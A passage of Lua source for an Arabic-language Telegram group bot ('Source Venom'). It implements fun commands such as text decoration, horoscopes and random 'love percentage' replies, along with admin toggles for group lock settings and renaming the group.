t = "𖠧︙قائمة الزخرفه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'md')
DevAbs:del(Venom..'Zrf:Abs'..msg.chat_id_..msg.sender_user_id_)
return false   
end
if not DevAbs:get(Venom..'Abs:Zrf:Abs'..msg.chat_id_) then
if text == 'زخرفه' and ChCheck(msg) or text == 'الزخرفه' and ChCheck(msg) then  
DevAbs:setex(Venom.."Zrf:Abs"..msg.chat_id_..msg.sender_user_id_,300,true)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ارسل لي الكلمه لزخرفتها \nيمكنك الزخرفة باللغه { en } ~ { ar } ', 1, 'md')
end
end
if not DevAbs:get(Venom..'Abs:Zrf:Abs'..msg.chat_id_) then
if text and text:match("^زخرفه (.*)$") and SourceCh(msg) or text and text:match("^زخرف (.*)$") and SourceCh(msg) then 
local TextZrf = text:match("^زخرفه (.*)$") or text:match("^زخرف (.*)$") 
UrlZrf = https.request('https://apiabs.ml/zrf.php?abs='..URL.escape(TextZrf)) 
Zrf = JSON.decode(UrlZrf) 
t = "𖠧︙قائمة الزخرفه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
i = 0
for k,v in pairs(Zrf.ok) do
i = i + 1
t = t..i.."~ `"..v.."` \n"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'md')
end
end
--     Source Venom     --
if text == "تفعيل الابراج" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الابراج بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Brg:Abs'..msg.chat_id_) 
end
if text == "تعطيل الابراج" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الابراج بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Brg:Abs'..msg.chat_id_,true)  
end
if not DevAbs:get(Venom..'Abs:Brg:Abs'..msg.chat_id_) then
if text and text:match("^برج (.*)$") and SourceCh(msg) or text and text:match("^برجي (.*)$") and SourceCh(msg) then 
local TextBrg = text:match("^برج (.*)$") or text:match("^برجي (.*)$") 
UrlBrg = https.request('https://apiabs.ml/brg.php?brg='..URL.escape(TextBrg)) 
Brg = JSON.decode(UrlBrg) 
t = Brg.ok.abs  
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Venom     --
if text and (text == "تفعيل اوامر النسب" or text == "تفعيل نسبه الحب" or text == "تفعيل نسبه الكره" or text == "تفعيل نسبه الرجوله" or text == "تفعيل نسبه الانوثه" or text == "تفعيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل اوامر النسب'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Nsba:Abs'..msg.chat_id_) 
end
if text and (text == "تعطيل اوامر النسب" or text == "تعطيل نسبه الحب" or text == "تعطيل نسبه الكره" or text == "تعطيل نسبه الرجوله" or text == "تعطيل نسبه الانوثه" or text == "تعطيل نسبه الغباء") and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل اوامر النسب'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Nsba:Abs'..msg.chat_id_,true)  
end
if not DevAbs:get(Venom..'Abs:Nsba:Abs'..msg.chat_id_) then
if text == "نسبه الحب" and SourceCh(msg) or text == "نسبة الحب" and SourceCh(msg) then
DevAbs:set(Venom..'LoveNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙قم بارسل اسمين لحساب نسبة الحب بينهما كمثال ↫ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الحب" and text ~= "نسبة الحب" and DevAbs:get(Venom..'LoveNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء امر نسبة الحب ', 1, 'md')
DevAbs:del(Venom..'LoveNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙نسبة الحب بين '..text..' هي : '..Abs..'%', 1, 'md')
DevAbs:del(Venom..'LoveNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAbs:get(Venom..'Abs:Nsba:Abs'..msg.chat_id_) then
if text == "نسبه الكره" and SourceCh(msg) or text == "نسبة الكره" and SourceCh(msg) then
DevAbs:set(Venom..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙قم بارسل اسمين لحساب نسبة الكره بينهما كمثال ↫ جاك وروز', 1, 'md')
end
end
if text and text ~= "نسبه الكره" and text ~= "نسبة الكره" and DevAbs:get(Venom..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء امر نسبة الكره ', 1, 'md')
DevAbs:del(Venom..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙نسبة الكره بين '..text..' هي : '..Abs..'%', 1, 'md')
DevAbs:del(Venom..'HataNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAbs:get(Venom..'Abs:Nsba:Abs'..msg.chat_id_) then
if text and (text == "نسبه الرجوله" or text == "نسبة الرجوله" or text == "نسبه رجوله" or text == "نسبة رجوله") and SourceCh(msg) then
DevAbs:set(Venom..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙قم بارسل اسم الشخص لقياس نسبة رجولته كمثال ↫ جاك', 1, 'md')
end
end
if text and text ~= "نسبه الرجوله" and text ~= "نسبة الرجوله" and text ~= "نسبه رجوله" and text ~= "نسبة رجوله" and DevAbs:get(Venom..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء امر نسبة الرجوله ', 1, 'md')
DevAbs:del(Venom..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙نسبة رجولة '..text..' هي : '..Abs..'%', 1, 'md')
DevAbs:del(Venom..'RjolaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAbs:get(Venom..'Abs:Nsba:Abs'..msg.chat_id_) then
if text and (text == "نسبه الانوثه" or text == "نسبة الانوثه" or text == "نسبه انوثه" or text == "نسبة انوثه") and SourceCh(msg) then
DevAbs:set(Venom..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙قم بارسل اسم الشخص لقياس نسبة انوثته كمثال ↫ روز', 1, 'md')
end
end
if text and text ~= "نسبه الانوثه" and text ~= "نسبة الانوثه" and text ~= "نسبه انوثه" and text ~= "نسبة انوثه" and DevAbs:get(Venom..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء امر نسبة الانوثه ', 1, 'md')
DevAbs:del(Venom..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙نسبة انوثة '..text..' هي : '..Abs..'%', 1, 'md')
DevAbs:del(Venom..'AnothaNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
if not DevAbs:get(Venom..'Abs:Nsba:Abs'..msg.chat_id_) then
if text and (text == "نسبه الغباء" or text == "نسبة الغباء") and SourceCh(msg) then
DevAbs:set(Venom..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_,true) 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙قم بارسل اسم الشخص لقياس نسبة غبائه كمثال ↫ جاك او روز', 1, 'md')
end
end
if text and text ~= "نسبه الغباء" and text ~= "نسبة الغباء" and DevAbs:get(Venom..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_) then
if text and text == 'الغاء' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم الغاء امر نسبة الغباء ', 1, 'md')
DevAbs:del(Venom..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end 
Abs = math.random(0,100);
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙نسبة غباء '..text..' هي : '..Abs..'%', 1, 'md')
DevAbs:del(Venom..'StupidNsba:Abs'..msg.chat_id_..msg.sender_user_id_) 
return false 
end
--     Source Venom     --
if text == "تفعيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل حساب العمر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Age:Abs'..msg.chat_id_) 
end
if text == "تعطيل حساب العمر" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل حساب العمر'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Age:Abs'..msg.chat_id_,true)  
end
if not DevAbs:get(Venom..'Abs:Age:Abs'..msg.chat_id_) then
if text and text:match("^احسب (.*)$") and SourceCh(msg) or text and text:match("^عمري (.*)$") and SourceCh(msg) then 
local TextAge = text:match("^احسب (.*)$") or text:match("^عمري (.*)$") 
UrlAge = https.request('https://apiabs.ml/age.php?age='..URL.escape(TextAge)) 
Age = JSON.decode(UrlAge) 
t = Age.ok.abs
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Venom     --
if text == "تفعيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل معاني الاسماء'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Mean:Abs'..msg.chat_id_) 
end
if text == "تعطيل معاني الاسماء" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل معاني الاسماء'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Mean:Abs'..msg.chat_id_,true)  
end
if not DevAbs:get(Venom..'Abs:Mean:Abs'..msg.chat_id_) then
if text and text:match("^معنى الاسم (.*)$") and SourceCh(msg) or text and text:match("^معنى اسم (.*)$") and SourceCh(msg) then 
local TextMean = text:match("^معنى الاسم (.*)$") or text:match("^معنى اسم (.*)$") 
UrlMean = https.request('https://apiabs.ml/Mean.php?Abs='..URL.escape(TextMean)) 
Mean = JSON.decode(UrlMean) 
t = Mean.ok.abs
Dev_Abs(msg.chat_id_, msg.id_, 1, t, 1, 'html')
end
end
--     Source Venom     --
if text == "تفعيل غنيلي" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل غنيلي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Audios:Abs'..msg.chat_id_) 
end
if text == "تعطيل غنيلي" and Manager(msg) and ChCheck(msg) then
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل غنيلي بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Audios:Abs'..msg.chat_id_,true)  
end
if text == "غنيلي" and not DevAbs:get(Venom..'Abs:Audios:Abs'..msg.chat_id_) and SourceCh(msg) then
data,res = https.request('https://apiabs.ml/Audios.php')
if res == 200 then
Audios = json:decode(data)
if Audios.Info == true then
local Text ='𖠧︙تم اختيار المقطع الصوتي لك'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𖠧 Venom TeAM .',url="t.me/venom_source"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id='..msg.chat_id_..'&voice='..URL.escape(Audios.info)..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
end
end
--     Source Venom     --
if Admin(msg) then
if DevAbs:get(Venom..'Abs:LockSettings'..msg.chat_id_) then 
if text == "الروابط" then if DevAbs:get(Venom..'Abs:Lock:Links'..msg.chat_id_) then mute_links = 'مقفله' else mute_links = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الروابط ↫ "..mute_links.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "المعرف" or text == "المعرفات" then if DevAbs:get(Venom..'Abs:Lock:Tags'..msg.chat_id_) then lock_tag = 'مقفوله' else lock_tag = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙المعرف ↫ "..lock_tag.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "المتحركه" or text == "الملصقات المتحركه" then if DevAbs:get(Venom..'Abs:Lock:Gifs'..msg.chat_id_) then mute_gifs = 'مقفوله' else mute_gifs = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙المتحركه ↫ "..mute_gifs.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الملصقات" then if DevAbs:get(Venom..'Abs:Lock:Stickers'..msg.chat_id_) then lock_sticker = 'مقفوله' else lock_sticker = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الملصقات ↫ "..lock_sticker.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الصور" then if DevAbs:get(Venom..'Abs:Lock:Photo'..msg.chat_id_) then mute_photo = 'مقفوله' else mute_photo = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الصور ↫ "..mute_photo.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الفيديو" or text == "الفيديوهات" then if DevAbs:get(Venom..'Abs:Lock:Videos'..msg.chat_id_) then mute_video = 'مقفوله' else mute_video = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الفيديو ↫ "..mute_video.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الاونلاين" then if DevAbs:get(Venom..'Abs:Lock:Inline'..msg.chat_id_) then mute_in = 'مقفل' else mute_in = 'مفتوح' end local VenomTEAM = "\n" .."𖠧︙الاونلاين ↫ "..mute_in.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الدردشه" then if DevAbs:get(Venom..'Abs:Lock:Text'..msg.chat_id_) then mute_text = 'مقفله' else mute_text = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الدردشه ↫ "..mute_text.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "التوجيه" or text == "اعاده التوجيه" then if DevAbs:get(Venom..'Abs:Lock:Forwards'..msg.chat_id_) then lock_forward = 'مقفل' else lock_forward = 'مفتوح' end local VenomTEAM = "\n" .."𖠧︙التوجيه ↫ "..lock_forward.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الاغاني" then if DevAbs:get(Venom..'Abs:Lock:Music'..msg.chat_id_) then mute_music = 'مقفوله' else mute_music = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الاغاني ↫ "..mute_music.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الصوت" or text == "الصوتيات" then if DevAbs:get(Venom..'Abs:Lock:Voice'..msg.chat_id_) then mute_voice = 'مقفول' else mute_voice = 'مفتوح' end local VenomTEAM = "\n" .."𖠧︙الصوت ↫ "..mute_voice.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الجهات" or text == "جهات الاتصال" then if DevAbs:get(Venom..'Abs:Lock:Contact'..msg.chat_id_) then lock_contact = 'مقفوله' else lock_contact = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الجهات ↫ "..lock_contact.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الماركداون" then if DevAbs:get(Venom..'Abs:Lock:Markdown'..msg.chat_id_) then markdown = 'مقفل' else markdown = 'مفتوح' end local VenomTEAM = "\n" .."𖠧︙الماركداون ↫ "..markdown.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الهاشتاك" then if DevAbs:get(Venom..'Abs:Lock:Hashtak'..msg.chat_id_) then lock_htag = 'مقفل' else lock_htag = 'مفتوح' end local VenomTEAM = "\n" .."𖠧︙الهاشتاك ↫ "..lock_htag.."\n"Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "التعديل" then if DevAbs:get(Venom..'Abs:Lock:EditMsgs'..msg.chat_id_) then mute_edit = 'مقفل' else mute_edit = 'مفتوح' end local VenomTEAM = "\n" .."𖠧︙التعديل ↫ "..mute_edit.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "التثبيت" then if DevAbs:get(Venom..'Abs:Lock:Pin'..msg.chat_id_) then lock_pin = 'مقفل' else lock_pin = 'مفتوح' end local VenomTEAM = "\n" .."𖠧︙التثبيت ↫ "..lock_pin.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الاشعارات" then if DevAbs:get(Venom..'Abs:Lock:TagServr'..msg.chat_id_) then lock_tgservice = 'مقفوله' else lock_tgservice = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الاشعارات ↫ "..lock_tgservice.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الكلايش" then if DevAbs:get(Venom..'Abs:Lock:Spam'..msg.chat_id_) then lock_spam = 'مقفوله' else lock_spam = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الكلايش ↫ "..lock_spam.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الدخول" then if DevAbs:get(Venom..'Abs:Lock:Join'..msg.chat_id_) then lock_Join = 'مقفول' else lock_Join = 'مفتوح' end local VenomTEAM = "\n" .."𖠧︙الدخول ↫ "..lock_Join.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الشبكات" then if DevAbs:get(Venom..'Abs:Lock:WebLinks'..msg.chat_id_) then lock_wp = 'مقفوله' else lock_wp = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الشبكات ↫ "..lock_wp.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "المواقع" then if DevAbs:get(Venom..'Abs:Lock:Location'..msg.chat_id_) then lock_location = 'مقفوله' else lock_location = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙المواقع ↫ "..lock_location.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "العربيه" then if DevAbs:get(Venom..'Abs:Lock:Arabic'..msg.chat_id_) then lock_arabic = 'مقفوله' else lock_arabic = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙العربيه ↫ "..lock_arabic.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الانكليزيه" then if DevAbs:get(Venom..'Abs:Lock:English'..msg.chat_id_) then lock_english = 'مقفوله' else lock_english = 'مفتوحه' end local VenomTEAM = "\n" .."𖠧︙الانكليزيه ↫ "..lock_english.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الكفر" then if DevAbs:get(Venom..'Abs:Lock:Kfr'..msg.chat_id_) then lock_kaf = 'مفتوح' else lock_kaf = 'مقفل' end local VenomTEAM = "\n" .."𖠧︙الكفر ↫ "..lock_kaf.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الفشار" then if DevAbs:get(Venom..'Abs:Lock:Fshar'..msg.chat_id_) then lock_fshar = 'مفتوح' else lock_fshar = 'مقفل' end local VenomTEAM = "\n" .."𖠧︙الفشار ↫ "..lock_fshar.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
if text == "الطائفيه" then if DevAbs:get(Venom..'Abs:Lock:Taf'..msg.chat_id_) then lock_taf = 'مفتوحه' else lock_taf = 'مقفله' end local VenomTEAM = "\n" .."𖠧︙الطائفيه ↫ "..lock_taf.."\n" Dev_Abs(msg.chat_id_, msg.id_, 1, VenomTEAM, 1, 'md') end
end
--     Source Venom     --
if text == 'تفعيل كشف الاعدادات' and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل كشف الاعدادات'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:LockSettings'..msg.chat_id_,true)  
end
if text == 'تعطيل كشف الاعدادات' and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل كشف الاعدادات'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:LockSettings'..msg.chat_id_) 
end
--     Source Venom     --
if text == 'تفعيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل اوامر التحشيش'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:Stupid'..msg.chat_id_)
end
if text == 'تعطيل اوامر التحشيش' and Manager(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل اوامر التحشيش'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:Stupid'..msg.chat_id_,true)
end
--     Source Venom     --
if text and (text == 'تعطيل التحقق' or text == 'قفل التحقق' or text == 'تعطيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل التحقق بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:Robot'..msg.chat_id_)
end
if text and (text == 'تفعيل التحقق' or text == 'فتح التحقق' or text == 'تفعيل تنبيه الدخول') and Manager(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل التحقق بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:Robot'..msg.chat_id_,true)
end
--     Source Venom     --
if text == 'تفعيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل ردود المدير'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:GpRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المدير' and Manager(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل ردود المدير'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:GpRed'..msg.chat_id_,true)
end
--     Source Venom     --
if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل ردود المطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom..'Abs:Lock:AllRed'..msg.chat_id_)
end
if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل ردود المطور'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom..'Abs:Lock:AllRed'..msg.chat_id_,true)
end
--     Source Venom     --
if SecondSudo(msg) then
if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره 𖠧' then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل المغادره بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom.."Abs:Left:Bot"..Venom)
end
if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره 𖠧' then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل المغادره بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom.."Abs:Left:Bot"..Venom,true) 
end 
if text == 'تفعيل الاذاعه' or text == '↫ تفعيل الاذاعه 𖠧' then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تفعيل الاذاعه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:del(Venom.."Abs:Send:Bot"..Venom)
end
if text == 'تعطيل الاذاعه' or text == '↫ تعطيل الاذاعه 𖠧' then 
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تعطيل الاذاعه بنجاح'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
DevAbs:set(Venom.."Abs:Send:Bot"..Venom,true) 
end
end
--     Source Venom     --
if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
local txt = {string.match(text, "^(ضع اسم) (.*)$")}
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"𖠧︙البوت ليس ادمن يرجى ترقيتي !")  
return false  
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"𖠧︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
else
local VenomTEAM = '𖠧︙اهلا عزيزي ↫ '..AbsRank(msg)..' \n𖠧︙تم تغير اسم المجموعه'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, VenomTEAM, 14, string.len(msg.sender_user_id_))
end
end,nil) 
end
--     Source Venom     --
if msg.content_.photo_ then
if DevAbs:get(Venom..'Abs:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
else
